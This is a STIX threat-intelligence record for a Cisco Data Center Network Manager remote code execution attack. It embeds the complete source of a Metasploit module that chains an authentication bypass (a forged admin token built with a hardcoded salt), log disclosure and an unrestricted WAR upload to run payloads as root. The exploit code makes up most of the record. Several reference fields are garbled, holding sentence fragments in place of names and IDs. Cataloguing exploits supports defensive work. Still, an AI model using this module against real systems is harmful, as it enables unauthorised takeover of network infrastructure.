{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2982cb31-c05a-49b9-9e97-14f1e8a3615f",
    "created": "2024-08-14T17:08:06.004016Z",
    "modified": "2024-08-14T17:08:06.00402Z",
    "name": "Cisco Data Center Network Manager Unauthenticated Remote Code Execution",
    "description": " DCNM exposes a file upload servlet (FileUploadServlet) at /fm/fileUpload. An authenticated user can abuse this servlet to upload a WAR to the Apache Tomcat webapps directory and achieve remote code execution as root.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/cisco_dcnm_upload_2019.rb",
            "external_id": "cisco_dcnm_upload_2019.rb"
        },
        {
            "source_name": "versions10.4(2)andbelow",
            "external_id": "andCVE-2019-1622(informationdisclosure)toobtainthecorrect"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-bypass"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-codex"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-dcnm-rce.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Jul/7"
        },
        {
            "source_name": "#useCVE-2019-1622tofetchthelogsunauthenticated",
            "external_id": "andgettheWARuploadpathfromjboss*.log"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco Data Center Network Manager Unauthenticated Remote Code Execution',\n      'Description'    => %q{\n        DCNM exposes a file upload servlet (FileUploadServlet) at /fm/fileUpload.\n        An authenticated user can abuse this servlet to upload a WAR to the Apache Tomcat webapps\n        directory and achieve remote code execution as root.\n        This module exploits two other vulnerabilities, CVE-2019-1619 for authentication bypass on\n        versions 10.4(2) and below, and CVE-2019-1622 (information disclosure) to obtain the correct\n        directory for the WAR file upload.\n        This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should\n        work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit\n        (see References to understand why).\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2019-1619' ], # auth bypass\n          [ 'CVE', '2019-1620' ], # file upload\n          [ 'CVE', '2019-1622' ], # log download\n          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-bypass' ],\n          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-codex' ],\n          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-dcnm-rce.txt' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jul/7' ]\n        ],\n      'Platform'       => 'java',\n      'Arch'           => ARCH_JAVA,\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'Cisco DCNM 11.1(1)', {}\n          ],\n          [\n            'Cisco DCNM 11.0(1)', {}\n          ],\n          [\n            'Cisco DCNM 10.4(2)', {}\n          ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' => { 'WfsDelay' => 10 },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2019-06-26'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Connect with TLS', true]),\n        OptString.new('TARGETURI', [true,  \"Default server path\", '/']),\n        OptString.new('USERNAME', [true,  \"Username for auth (required only for 11.0(1) and above\", 'admin']),\n        OptString.new('PASSWORD', [true,  \"Password for auth (required only for 11.0(1) and above\", 'admin']),\n      ])\n  end\n\n  def check\n    # at the moment this is the best way to detect\n    # check if pmreport and fileUpload servlets return a 500 error with no params\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'fm', 'pmreport'),\n      'vars_get'  =>\n      {\n        'token'  => rand_text_alpha(5..20)\n      },\n      'method' => 'GET'\n    )\n    if res && res.code == 500\n      res = send_request_cgi(\n        'uri'    => normalize_uri(target_uri.path, 'fm', 'fileUpload'),\n        'method' => 'GET',\n      )\n      if res && res.code == 500\n        return CheckCode::Detected\n      end\n    end\n\n    CheckCode::Unknown\n  end\n\n  def target_select\n    if target != targets[0]\n      return target\n    else\n      res = send_request_cgi(\n        'uri'    => normalize_uri(target_uri.path, 'fm', 'fmrest', 'about','version'),\n        'method' => 'GET'\n      )\n      if res && res.code == 200\n        if res.body.include?('version\":\"11.1(1)')\n          print_good(\"#{peer} - Detected DCNM 11.1(1)\")\n          print_status(\"#{peer} - No authentication required, ready to exploit!\")\n          return targets[1]\n        elsif res.body.include?('version\":\"11.0(1)')\n          print_good(\"#{peer} - Detected DCNM 11.0(1)\")\n          print_status(\"#{peer} - Note that 11.0(1) requires valid authentication credentials to exploit\")\n          return targets[2]\n        elsif res.body.include?('version\":\"10.4(2)')\n          print_good(\"#{peer} - Detected DCNM 10.4(2)\")\n          print_status(\"#{peer} - No authentication required, ready to exploit!\")\n          return targets[3]\n        else\n          print_error(\"#{peer} - Failed to detect target version.\")\n          print_error(\"Please contact module author or add the target yourself and submit a PR to the Metasploit project!\")\n          print_error(res.body)\n          print_status(\"#{peer} - We will proceed assuming the version is below 10.4(2) and vulnerable to auth bypass\")\n          return targets[3]\n        end\n      end\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to determine target\")\n    end\n  end\n\n  def auth_v11\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'fm/'),\n      'method' => 'GET',\n      'vars_get'  =>\n      {\n        'userName'  => datastore['USERNAME'],\n        'password'  => datastore['PASSWORD']\n      },\n    )\n\n    if res && res.code == 200\n      # get the JSESSIONID cookie\n      if res.get_cookies\n        res.get_cookies.split(';').each do |cok|\n          if cok.include?(\"JSESSIONID\")\n            return cok\n          end\n        end\n      end\n    end\n  end\n\n  def auth_v10\n    # step 1: get a JSESSIONID cookie and the server Date header\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'fm/'),\n      'method' => 'GET'\n    )\n\n    # step 2: convert the Date header and create the auth hash\n    if res && res.headers['Date']\n      jsession = res.get_cookies.split(';')[0]\n      date = Time.httpdate(res.headers['Date'])\n      server_date = date.strftime(\"%s\").to_i * 1000\n      print_good(\"#{peer} - Got sysTime value #{server_date.to_s}\")\n\n      # auth hash format:\n      # username + sessionId + sysTime + POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF\n      session_id = rand(1000..50000).to_s\n      md5 = Digest::MD5.digest 'admin' + session_id + server_date.to_s +\n        \"POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF\"\n      md5_str = Base64.strict_encode64(md5)\n\n      # step 3: authenticate our cookie as admin\n      # token format: sessionId.sysTime.md5_str.username\n      res = send_request_cgi(\n        'uri'    => normalize_uri(target_uri.path, 'fm', 'pmreport'),\n        'cookie' => jsession,\n        'vars_get'  =>\n        {\n          'token'  => \"#{session_id}.#{server_date.to_s}.#{md5_str}.admin\"\n        },\n        'method' => 'GET'\n      )\n\n      if res && res.code == 500\n        return jsession\n      end\n    end\n  end\n\n  # use CVE-2019-1622 to fetch the logs unauthenticated, and get the WAR upload path from jboss*.log\n  def get_war_path\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'fm', 'log', 'fmlogs.zip'),\n      'method' => 'GET'\n    )\n\n    if res && res.code == 200\n      tmp = Tempfile.new\n      # we have to drop this into a file first\n      # else we will get a Zip::GPFBit3Error if we use an InputStream\n      File.binwrite(tmp, res.body)\n      Zip::File.open(tmp) do |zis|\n        zis.each do |entry|\n          if entry.name =~ /jboss[0-9]*\\.log/\n            fdata = zis.read(entry)\n            if fdata[/Started FileSystemDeploymentService for directory ([\\w\\/\\\\\\-\\.: ]+)/]\n              tmp.close\n              tmp.unlink\n              return $1.strip\n            end\n          end\n        end\n      end\n    end\n  end\n\n\n  def exploit\n    target = target_select\n\n    if target == targets[2]\n      jsession = auth_v11\n    elsif target == targets[3]\n      jsession = auth_v10\n    end\n\n    # targets[1] DCNM 11.1(1) doesn't need auth!\n    if jsession.nil? && target != targets[1]\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to authenticate JSESSIONID cookie\")\n    elsif target != targets[1]\n      print_good(\"#{peer} - Successfully authenticated our JSESSIONID cookie\")\n    end\n\n    war_path = get_war_path\n    if war_path.nil? or war_path.empty?\n      fail_with(Failure::Unknown, \"#{peer} - Failed to get WAR path from logs\")\n    else\n      print_good(\"#{peer} - Obtain WAR path from logs: #{war_path}\")\n    end\n\n    # Generate our payload... and upload it\n    app_base = rand_text_alphanumeric(6..16)\n    war_payload = payload.encoded_war({ :app_name => app_base }).to_s\n\n    fname = app_base + '.war'\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(fname, nil, nil, content_disposition = \"form-data; name=\\\"fname\\\"\")\n    post_data.add_part(war_path, nil, nil, content_disposition = \"form-data; name=\\\"uploadDir\\\"\")\n    post_data.add_part(war_payload,\n                       \"application/octet-stream\", 'binary',\n                       \"form-data; name=\\\"#{rand_text_alpha(5..20)}\\\"; filename=\\\"#{rand_text_alpha(6..10)}\\\"\")\n    data = post_data.to_s\n\n    print_status(\"#{peer} - Uploading payload...\")\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'fm', 'fileUpload'),\n      'method' => 'POST',\n      'data'   => data,\n      'cookie' => jsession,\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\"\n    )\n\n    if res && res.code == 200 && res.body[/#{fname}/]\n      print_good(\"#{peer} - WAR uploaded, waiting a few seconds for deployment...\")\n\n      sleep 10\n\n      print_status(\"#{peer} - Executing payload...\")\n      send_request_cgi(\n        'uri'    => normalize_uri(target_uri.path, app_base),\n        'method' => 'GET'\n      )\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to upload WAR file\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-06-26",
    "x_mitre_platforms": [
        "java'"
    ]
}